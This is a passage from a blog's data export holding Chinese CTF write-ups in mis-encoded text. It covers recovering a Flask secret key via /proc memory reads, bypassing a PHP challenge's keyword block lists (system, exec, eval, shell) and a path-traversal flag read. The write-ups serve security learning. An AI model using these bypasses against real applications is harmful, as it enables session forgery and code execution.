================================================== --&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&lt;title&gt;Cat cat&lt;/title&gt;&lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;&lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;&lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;&lt;!-- Mobile Specific Metas ================================================== --&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0&quot;&gt;&lt;link rel=&quot;icon&quot; type=&quot;image/x-icon&quot; href=&quot;images/favicon.ico&quot;&gt;&lt;!-- CSS ================================================== --&gt;&lt;link href=&quot;css/bootstrap.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;css/bootstrap-theme.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;vendor/magnific/magnific-popup.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;vendor/owl-carousel/css/owl.carousel.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;vendor/owl-carousel/css/owl.theme.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;!--[if lte IE 9]&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/ie.css&quot; media=&quot;screen&quot; /&gt;&lt;![endif]--&gt;&lt;link href=&quot;css/custom.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;!-- CUSTOM STYLESHEET FOR STYLING --&gt;&lt;!-- Color Style --&gt;&lt;link href=&quot;colors/color1.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;!-- SCRIPTS ================================================== --&gt;&lt;script src=&quot;js/modernizr.js&quot;&gt;&lt;/script&gt;&lt;!-- Modernizr --&gt;&lt;/head&gt;&lt;body class=&quot;home&quot;&gt;&lt;!--[if lt IE 7]&gt; &lt;p class=&quot;chromeframe&quot;&gt;You are using an outdated browser. &lt;a href=&quot;http://browsehappy.com/&quot;&gt;Upgrade your browser today&lt;/a&gt; or &lt;a href=&quot;http://www.google.com/chromeframe/?redirect=true&quot;&gt;install Google Chrome Frame&lt;/a&gt; to better experience this site.&lt;/p&gt;&lt;![endif]--&gt;&lt;div class=&quot;body&quot;&gt; &lt;!-- Start Header --&gt; &lt;div class=&quot;header-wrapper&quot; style=&quot;height: 60px&quot;&gt; &lt;header class=&quot;site-header&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;site-tagline&quot;&gt;Cat &amp;amp; Many kinds of cats&lt;/div&gt; &lt;a href=&quot;#&quot; class=&quot;btn btn-default btn-sm&quot; id=&quot;contact-info&quot;&gt;&lt;i class=&quot;fa fa-bars&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;/div&gt; &lt;/header&gt; &lt;/div&gt; &lt;!-- End Header --&gt; &lt;div class=&quot;lgray-bg&quot; style=&quot;background-image:url(images/leaves3.png); background-repeat:repeat&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;h4 class=&quot;stacked-title&quot; style=&quot;background-color:black&quot;&gt;&lt;a href=&quot;/&quot;&gt;Cats&lt;/a&gt;&lt;/h4&gt; &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-md-10 col-sm-12&quot;&gt; &lt;div class=&quot;feature-block&quot; style=&quot;float: left&quot;&gt; &lt;img src=&quot;cats/{{catname}}.jpg&quot; alt=&quot;{{catname}}&quot;&gt; &lt;h5&gt;{{catname}}&lt;/h5&gt; &lt;p&gt;{{info}}&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;spacer-50&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- Site Footer --&gt; &lt;div class=&quot;site-footer-bottom&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-md-6 col-sm-6&quot;&gt; &lt;div class=&quot;copyrights-col-left&quot;&gt; &lt;p&gt;&amp;copy; 2022 Cat cat by lx56@blog.lxscloud.top. All Rights Reserved&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;col-md-6 col-sm-6&quot;&gt; &lt;div class=&quot;copyrights-col-right&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;a id=&quot;back-to-top&quot;&gt;&lt;i class=&quot;fa fa-angle-double-up&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;&lt;script src=&quot;js/jquery-2.2.3.min.js&quot;&gt;&lt;/script&gt; &lt;!-- Jquery Library Call --&gt;&lt;script src=&quot;vendor/magnific/jquery.magnific-popup.min.js&quot;&gt;&lt;/script&gt; &lt;!-- PrettyPhoto Plugin --&gt;&lt;script src=&quot;js/ui-plugins.js&quot;&gt;&lt;/script&gt; &lt;!-- UI Plugins --&gt;&lt;script src=&quot;js/helper-plugins.js&quot;&gt;&lt;/script&gt; &lt;!-- Helper Plugins --&gt;&lt;script src=&quot;vendor/owl-carousel/js/owl.carousel.min.js&quot;&gt;&lt;/script&gt; &lt;!-- Owl Carousel --&gt;&lt;script src=&quot;js/bootstrap.js&quot;&gt;&lt;/script&gt; &lt;!-- UI --&gt;&lt;script src=&quot;js/init.js&quot;&gt;&lt;/script&gt; &lt;!-- All Scripts --&gt;&lt;script src=&quot;vendor/flexslider/js/jquery.flexslider.js&quot;&gt;&lt;/script&gt; &lt;!-- FlexSlider --&gt;&lt;/body&gt;&lt;/html&gt; æ–‡ä»¶éƒ½æ˜¯bytesç±»å‹ï¼ŒSSTIæ²¡çš„æ‰“,emmmmm å†çœ‹çœ‹index.htmlï¼Œemmè¿˜æ˜¯æ¯«æ— ç”¨å¤„emmmmm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;!DOCTYPE HTML&gt;&lt;html class=&quot;no-js&quot;&gt;&lt;head&gt;&lt;!-- Basic Page Needs ================================================== --&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&lt;title&gt;Cat cat&lt;/title&gt;&lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;&lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;&lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;&lt;!-- Mobile Specific Metas ================================================== --&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0&quot;&gt;&lt;link rel=&quot;icon&quot; type=&quot;image/x-icon&quot; href=&quot;images/favicon.ico&quot;&gt;&lt;!-- CSS ================================================== --&gt;&lt;link href=&quot;css/bootstrap.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;css/bootstrap-theme.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;vendor/magnific/magnific-popup.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;vendor/owl-carousel/css/owl.carousel.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;vendor/owl-carousel/css/owl.theme.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;!--[if lte IE 9]&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/ie.css&quot; media=&quot;screen&quot; /&gt;&lt;![endif]--&gt;&lt;link href=&quot;css/custom.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;!-- CUSTOM STYLESHEET FOR STYLING --&gt;&lt;!-- Color Style --&gt;&lt;link href=&quot;colors/color1.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;!-- SCRIPTS ================================================== --&gt;&lt;script src=&quot;js/modernizr.js&quot;&gt;&lt;/script&gt;&lt;!-- Modernizr --&gt;&lt;/head&gt;&lt;body class=&quot;home&quot;&gt;&lt;!--[if lt IE 7]&gt; &lt;p class=&quot;chromeframe&quot;&gt;You are using an outdated browser. &lt;a href=&quot;http://browsehappy.com/&quot;&gt;Upgrade your browser today&lt;/a&gt; or &lt;a href=&quot;http://www.google.com/chromeframe/?redirect=true&quot;&gt;install Google Chrome Frame&lt;/a&gt; to better experience this site.&lt;/p&gt;&lt;![endif]--&gt;&lt;div class=&quot;body&quot;&gt; &lt;!-- Start Header --&gt; &lt;div class=&quot;header-wrapper&quot; style=&quot;height: 60px&quot;&gt; &lt;header class=&quot;site-header&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;site-tagline&quot;&gt;Cat &amp;amp; Many kinds of cats&lt;/div&gt; &lt;a href=&quot;#&quot; class=&quot;btn btn-default btn-sm&quot; id=&quot;contact-info&quot;&gt;&lt;i class=&quot;fa fa-bars&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;/div&gt; &lt;/header&gt; &lt;/div&gt; &lt;!-- End Header --&gt; &lt;div class=&quot;lgray-bg&quot; style=&quot;background-image:url(images/leaves3.png); background-repeat:repeat&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;h4 class=&quot;stacked-title&quot; style=&quot;background-color:black&quot;&gt;Cats&lt;/h4&gt; &lt;div class=&quot;row&quot;&gt; {% for a_cat in cats_list %} &lt;div class=&quot;col-md-3 col-sm-6&quot;&gt; &lt;div class=&quot;feature-block&quot;&gt; &lt;img src=&quot;cats/{{a_cat}}.jpg&quot; alt=&quot;{{a_cat}}&quot;&gt; &lt;h5&gt;{{a_cat}}&lt;/h5&gt; &lt;p&gt;&lt;a href=&quot;/info?file={{a_cat}}.txt&quot;&gt;{{cat(&quot;./details/&quot;+a_cat+&quot;.txt&quot;, 0, 80).decode()}}...&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; {% endfor %} &lt;/div&gt; &lt;div class=&quot;spacer-50&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- Site Footer --&gt; &lt;div class=&quot;site-footer-bottom&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-md-6 col-sm-6&quot;&gt; &lt;div class=&quot;copyrights-col-left&quot;&gt; &lt;p&gt;&amp;copy; 2022 Cat cat by lx56@blog.lxscloud.top. All Rights Reserved&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;col-md-6 col-sm-6&quot;&gt; &lt;div class=&quot;copyrights-col-right&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;a id=&quot;back-to-top&quot;&gt;&lt;i class=&quot;fa fa-angle-double-up&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;&lt;script src=&quot;js/jquery-2.2.3.min.js&quot;&gt;&lt;/script&gt; &lt;!-- Jquery Library Call --&gt;&lt;script src=&quot;vendor/magnific/jquery.magnific-popup.min.js&quot;&gt;&lt;/script&gt; &lt;!-- PrettyPhoto Plugin --&gt;&lt;script src=&quot;js/ui-plugins.js&quot;&gt;&lt;/script&gt; &lt;!-- UI Plugins --&gt;&lt;script src=&quot;js/helper-plugins.js&quot;&gt;&lt;/script&gt; &lt;!-- Helper Plugins --&gt;&lt;script src=&quot;vendor/owl-carousel/js/owl.carousel.min.js&quot;&gt;&lt;/script&gt; &lt;!-- Owl Carousel --&gt;&lt;script src=&quot;js/bootstrap.js&quot;&gt;&lt;/script&gt; &lt;!-- UI --&gt;&lt;script src=&quot;js/init.js&quot;&gt;&lt;/script&gt; &lt;!-- All Scripts --&gt;&lt;script src=&quot;vendor/flexslider/js/jquery.flexslider.js&quot;&gt;&lt;/script&gt; &lt;!-- FlexSlider --&gt;&lt;/body&gt;&lt;/html&gt; å…¸ä¸­å…¸ åªå›  åˆ flagåªå­˜åœ¨å˜é‡ä¸­ç®€å•åˆ†æä¸€ä¸‹ï¼Œæœ¬é¢˜çœ‹ç€å¥½åƒä½¿ç”¨äº†æ¨¡æ¿ï¼Œä½†æ˜¯å¹¶ä¸èƒ½æ‰“sstiï¼Œæ‰€ä»¥è¯´éœ€è¦é€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–çš„è·¯ç”±ä¸‹è½½ç‰¹å®šæ–‡ä»¶ã€‚Debugæ¨¡å¼å…³é—­ï¼Œç®—pinèµ°consoleè‚¯å®šä¸è¡Œäº†. ä¼—æ‰€å‘¨çŸ¥ï¼Œpythonè¿è¡Œçš„æ—¶å€™ï¼Œä¼šæŠŠå¯¹è±¡å­˜å‚¨åœ¨å †åŒºé‡Œï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯»å–å †åŒºçš„ä¸œè¥¿æ¥è¿‡å»keyç„¶åå°±èƒ½ä¼ªé€ sessionä»adminè·¯ç”±å ‚è€Œçš‡ä¹‹çš„è·å–flagäº†ï¼Œåœ¨æœ¬é¢˜ä¸­ï¼Œæä¾›äº†ä¸€ä¸ªcat.pyï¼Œè¿™è®©æˆ‘ä»¬å¯ä»¥å¸¦åç§»é‡çš„è¯»å–æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ‹¥æœ‰äº†åœ¨å†…å­˜æµ·æ´‹é‡Œâ€èˆªè¡Œâ€çš„èˆ¹æ¡¨(ä¸ä¼šå‡ºç°æŒ‡å‘å†…å­˜çš„ç©ºæŒ‡é’ˆ)ï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ä¾¿æ˜¯åç§»é‡ï¼Œä¸ç”¨æ‹…å¿ƒï¼Œ/proc/pid/mapså°±å…¨éƒ½ç»™å‡ºæ¥äº† æ¯”å¦‚è¿™æ ·: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162root@VM-8-17-ubuntu:/proc/59428# cat maps00400000-00423000 r--p 00000000 fc:02 130987 /usr/bin/python3.800423000-006b0000 r-xp 00023000 fc:02 130987 /usr/bin/python3.8006b0000-008ec000 r--p 002b0000 fc:02 130987 /usr/bin/python3.8008ed000-008ee000 r--p 004ec000 fc:02 130987 /usr/bin/python3.8008ee000-00935000 rw-p 004ed000 fc:02 130987 /usr/bin/python3.800935000-00958000 rw-p 00000000 00:00 0 00b1b000-00bc5000 rw-p 00000000 00:00 0 [heap]7f082cb41000-7f082cd66000 rw-p 00000000 00:00 0 7f082cd66000-7f082d04c000 r--p 00000000 fc:02 161431 /usr/lib/locale/locale-archive7f082d04c000-7f082d04f000 rw-p 00000000 00:00 0 7f082d04f000-7f082d051000 r--p 00000000 fc:02 138114 /usr/lib/x86_64-linux-gnu/libz.so.1.2.117f082d051000-7f082d062000 r-xp 00002000 fc:02 138114 /usr/lib/x86_64-linux-gnu/libz.so.1.2.117f082d062000-7f082d068000 r--p 00013000 fc:02 138114 /usr/lib/x86_64-linux-gnu/libz.so.1.2.117f082d068000-7f082d069000 ---p 00019000 fc:02 138114 /usr/lib/x86_64-linux-gnu/libz.so.1.2.117f082d069000-7f082d06a000 r--p 00019000 fc:02 138114 /usr/lib/x86_64-linux-gnu/libz.so.1.2.117f082d06a000-7f082d06b000 rw-p 0001a000 fc:02 138114 /usr/lib/x86_64-linux-gnu/libz.so.1.2.117f082d06b000-7f082d06d000 rw-p 00000000 00:00 0 7f082d06d000-7f082d071000 r--p 00000000 fc:02 130659 /usr/lib/x86_64-linux-gnu/libexpat.so.1.6.117f082d071000-7f082d08d000 r-xp 00004000 fc:02 130659 /usr/lib/x86_64-linux-gnu/libexpat.so.1.6.117f082d08d000-7f082d097000 r--p 00020000 fc:02 130659 /usr/lib/x86_64-linux-gnu/libexpat.so.1.6.117f082d097000-7f082d098000 ---p 0002a000 fc:02 130659 /usr/lib/x86_64-linux-gnu/libexpat.so.1.6.117f082d098000-7f082d09a000 r--p 0002a000 fc:02 130659 /usr/lib/x86_64-linux-gnu/libexpat.so.1.6.117f082d09a000-7f082d09b000 rw-p 0002c000 fc:02 130659 /usr/lib/x86_64-linux-gnu/libexpat.so.1.6.117f082d09b000-7f082d0aa000 r--p 00000000 fc:02 138508 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f082d0aa000-7f082d151000 r-xp 0000f000 fc:02 138508 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f082d151000-7f082d1e8000 r--p 000b6000 fc:02 138508 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f082d1e8000-7f082d1e9000 r--p 0014c000 fc:02 138508 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f082d1e9000-7f082d1ea000 rw-p 0014d000 fc:02 138508 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f082d1ea000-7f082d1eb000 r--p 00000000 fc:02 138626 /usr/lib/x86_64-linux-gnu/libutil-2.31.so7f082d1eb000-7f082d1ec000 r-xp 00001000 fc:02 138626 /usr/lib/x86_64-linux-gnu/libutil-2.31.so7f082d1ec000-7f082d1ed000 r--p 00002000 fc:02 138626 /usr/lib/x86_64-linux-gnu/libutil-2.31.so7f082d1ed000-7f082d1ee000 r--p 00002000 fc:02 138626 /usr/lib/x86_64-linux-gnu/libutil-2.31.so7f082d1ee000-7f082d1ef000 rw-p 00003000 fc:02 138626 /usr/lib/x86_64-linux-gnu/libutil-2.31.so7f082d1ef000-7f082d1f0000 r--p 00000000 fc:02 138416 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f082d1f0000-7f082d1f2000 r-xp 00001000 fc:02 138416 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f082d1f2000-7f082d1f3000 r--p 00003000 fc:02 138416 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f082d1f3000-7f082d1f4000 r--p 00003000 fc:02 138416 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f082d1f4000-7f082d1f5000 rw-p 00004000 fc:02 138416 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f082d1f5000-7f082d1fc000 r--p 00000000 fc:02 138569 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f082d1fc000-7f082d20d000 r-xp 00007000 fc:02 138569 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f082d20d000-7f082d212000 r--p 00018000 fc:02 138569 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f082d212000-7f082d213000 r--p 0001c000 fc:02 138569 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f082d213000-7f082d214000 rw-p 0001d000 fc:02 138569 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f082d214000-7f082d218000 rw-p 00000000 00:00 0 7f082d218000-7f082d23d000 r--p 00000000 fc:02 138398 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f082d23d000-7f082d3b5000 r-xp 00025000 fc:02 138398 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f082d3b5000-7f082d3ff000 r--p 0019d000 fc:02 138398 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f082d3ff000-7f082d400000 ---p 001e7000 fc:02 138398 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f082d400000-7f082d403000 r--p 001e7000 fc:02 138398 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f082d403000-7f082d406000 rw-p 001ea000 fc:02 138398 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f082d406000-7f082d40c000 rw-p 00000000 00:00 0 7f082d412000-7f082d419000 r--s 00000000 fc:02 262948 /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache7f082d419000-7f082d41a000 r--p 00000000 fc:02 138367 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f082d41a000-7f082d43d000 r-xp 00001000 fc:02 138367 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f082d43d000-7f082d445000 r--p 00024000 fc:02 138367 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f082d446000-7f082d447000 r--p 0002c000 fc:02 138367 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f082d447000-7f082d448000 rw-p 0002d000 fc:02 138367 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f082d448000-7f082d449000 rw-p 00000000 00:00 0 7fffbbe8a000-7fffbbeab000 rw-p 00000000 00:00 0 [stack]7fffbbf92000-7fffbbf95000 r--p 00000000 00:00 0 [vvar]7fffbbf95000-7fffbbf96000 r-xp 00000000 00:00 0 [vdso] å‰é¢çš„ä¾¿æ˜¯åœ°å€å’Œåç§»é‡ï¼Œåªéœ€è¦è¯»å–è¿™äº›ï¼Œç„¶åå†æ ¹æ®è¿™ä¸ªåœ°å€è¿›è¡Œå†…å­˜çš„è¯»å–å°±å¯ä»¥æŠŠkeyè¯»å‡ºæ¥äº†ï¼Œç„¶åå°±èƒ½è¯»å–å†…å­˜äº†ã€‚ ä»app.pyé‡Œçš„ä»£ç æ¥çœ‹ï¼Œkeyåé¢è·Ÿç€éƒ½æ˜¯*abcdefghï¼Œåªéœ€è¦æ‰¾åˆ°å«æœ‰è¿™ä¸ªå­—ç¬¦ä¸²çš„å†…å®¹è¾“å‡ºï¼Œå°±èƒ½ç›´æ¥æ‰¾åˆ°keyäº†ï¼Œè¿˜å¯ä»¥æ›´ç®€å•ç²—æš´ä¸€ç‚¹ï¼Œæ ¼å¼æ˜¯UUID+â€*abcdefghâ€ï¼Œå¯ä»¥å†™ä¸ªæ­£åˆ™è¡¨è¾¾å¼è¾“å‡ºã€‚ è‡³äºkeyè·å¾—äº†ï¼Œå°±å¯ä»¥ç›´æ¥é€šè¿‡flask-session-cookie-manager3.py(githubæœ‰æºç )æäº‹æƒ…äº†qwq æ€»ç»“:1.åœ¨æœ‰ä»»æ„æ–‡ä»¶è¯»å–çš„åœ°æ–¹ï¼Œå¯ä»¥é€šè¿‡/proc/pid/cmdlineæ‰«æè¿›ç¨‹2.å¯ä»¥é€šè¿‡/proc/pid/fd/3æ¢å¤pythonä¸­Openä½†æ˜¯å¹¶æ²¡æœ‰closeçš„æ–‡ä»¶ 0xFFFF Reform","link":"/2023/01/05/%E6%B5%85%E8%B0%88proc/"},{"title":"åˆ·é¢˜è®°å½•23-1-11","text":"[BJDCTF2020]EzPHPæŸ¥çœ‹æºä»£ç  12&lt;!-- Here is the real page =w= --&gt;&lt;!-- GFXEIM3YFZYGQ4A= --&gt; base32è§£ç 1nD3x.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET['shana'];$passwd = $_GET['passwd'];$arg = '';$code = '';echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) { if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?'); }if (!preg_match('/http|https/i', $_GET['file'])) { if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') { $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; } } else die('fxck you! What do you want to do ?!');if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); } } if (file_get_contents($file) !== 'debu_debu_aqua') die(&quot;Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ){ extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;} else{ die(&quot;fxck you! you don't know my password! And you don't know sha1! why you come here!&quot;);}if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=&quot;); } else { include &quot;flag.php&quot;; $code('', $arg); } ?&gt; ç¬¬ä¸€ä¸ªif123456if($_SERVER) { if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?'); } åœ°å›¾ç‚®ç‰ˆåŸºæœ¬è¿‡æ»¤,å°±åœ¨é‚£é‡Œæ¶å¿ƒäººurlç¼–ç è¿‡å» 123456if (!preg_match('/http|https/i', $_GET['file'])) { if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') { $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; } } else die('fxck you! What do you want to do ?!'); è¿‡æ­£åˆ™ï¼Œåˆè¦ä¸å…¨ç­‰äºï¼Œå‰é¢æ­£åˆ™åŒ¹é…ï¼ŒåŠ ä¸ªæ¢è¡Œå°±è¡Œäº† 123456if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); } } $_REQUESTç‰¹æ€§ å½“æˆ‘åªä¼ å…¥?aaa=111æ­¤æ—¶$_REQUEST=array(1) { [&quot;aaa&quot;]=&gt; string(3) &quot;111&quot; },å¦‚æœæˆ‘å†åŒæ—¶POSTä¸€ä¸ªaaa=123æ—¶å€™ï¼Œ$_REQUEST=array(1) { [&quot;aaa&quot;]=&gt; string(3) &quot;123&quot; }åˆ©ç”¨è¿™ä¸ªç‰¹æ€§è¦†å†™ 12if (file_get_contents($file) !== 'debu_debu_aqua') die(&quot;Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;&quot;); dataä¼ªåè®®è¦†å†™,è®°å¾—POSTè¦†ç›–ä¸€ä¸‹ 1234567if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ){ extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;} else{ die(&quot;fxck you! you don't know my password! And you don't know sha1! why you come here!&quot;);} æ•°ç»„æŠ¥é”™ç»•è¿‡ï¼Œè·å¾—å…³é”®extract($_GET[&quot;flag&quot;]); 1234567if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=&quot;); } else { include &quot;flag.php&quot;; $code('', $arg); } ?&gt; create_function()æ­¤å¤„include flag.phpå¤§èƒ†çŒœæµ‹flagåœ¨å˜é‡ä¸­ï¼Œå¯ä»¥ç›´æ¥è¾“å‡ºæ‰€æœ‰çš„å˜é‡ [&quot;ffffffff11111114ggggg&quot;]=&gt; string(89) &quot;Baka, do you think it's so easy to get my flag? I hid the real flag in rea1fl4g.php å–åç»•è¿‡ï¼Œä¼ªåè®®è¯»å–rea1fl4g.php [ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite?actionç–‘ä¼¼ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè²Œä¼¼ä¼ªåè®®è¯»ä¸å‡ºæ¥ï¼Œè¯»å–ä¸€ä¸‹/start.sh 1#!/bin/bash if [[ -f /flag.sh ]]; then source /flag.sh fi apache2-foreground å¯„ï¼ŒæŠ•æœºå–å·§æ²¡æˆåŠŸï¼Œflag.shè¢«åˆ äº† æ•´äº†ä¸€åœˆå•¥éƒ½æ²¡å¼„åˆ°ï¼Œçœ‹äº†çœ¼wp å¦ˆçš„ï¼Œç›´æ¥åŒ…å«../../flag","link":"/2023/01/11/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-23-1-11/"},{"title":"ä»è¥¿æ¹–è®ºå‰‘å­¦åˆ°çš„javascriptç‰¹æ€§","text":"0x00 å‰è¨€è¥¿æ¹–è®ºå‰‘â€¦ä¸€é¢˜æ²¡å‡º æ…äº†jsçªäº†ï¼Œå…¨æ˜¯æ²¡å’‹å­¦ä¹ è¿‡çš„javascript 0x01 Javascript 